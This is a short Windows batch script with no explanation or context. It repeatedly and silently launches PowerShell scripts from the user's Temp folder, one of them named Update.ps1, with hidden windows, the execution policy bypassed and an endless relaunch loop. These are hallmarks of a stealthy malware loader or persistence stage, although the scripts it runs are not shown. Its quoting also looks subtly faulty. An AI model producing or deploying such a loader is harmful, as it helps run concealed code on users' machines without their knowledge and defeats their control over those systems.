@echo off
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\Update.ps1"
set sp1="%USERPROFILE%\AppData\Local\Temp\MyScript.ps1"
set sp2="%USERPROFILE%\AppData\Local\Temp\RunX.ps1"

:loop
timeout /t 3 >nul

if exist "%sp1%" (
   powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp1%"
) else (
   powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp2%"
)

timeout /t 60 >nul
start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\stop.ps1"
timeout /t 1 >nul
goto loop
